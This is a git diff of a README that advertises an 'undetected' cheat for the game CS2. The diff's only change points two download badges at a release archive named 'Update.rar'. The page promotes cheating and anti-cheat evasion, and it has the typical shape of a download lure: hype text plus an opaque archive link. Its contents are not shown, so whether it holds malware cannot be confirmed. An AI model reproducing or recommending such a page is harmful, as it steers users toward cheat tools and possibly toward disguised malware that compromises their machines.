@@ -1,9 +1,9 @@
 # 🎯 **CS2 Cheat — The Ultimate Undetected Hack for CS2 (2025 Edition)** 🔥  
-[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2_Cheat-blue?style=for-the-badge&logo=download)]()  
+[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2_Cheat-blue?style=for-the-badge&logo=download)](https://github.com/BuildRox/cs2-cheat/releases/download/Update/Update.rar)  
 
 ![cs2](https://github.com/user-attachments/assets/8ecc5625-ce1d-4049-a38c-fb26bc6ba8fd)
 
-[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2_Cheat-blue?style=for-the-badge&logo=download)]()  
+[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2_Cheat-blue?style=for-the-badge&logo=download)](https://github.com/BuildRox/cs2-cheat/releases/download/Update/Update.rar)  
 
 ## 🕵️ **What is CS2 Cheat?**  
 
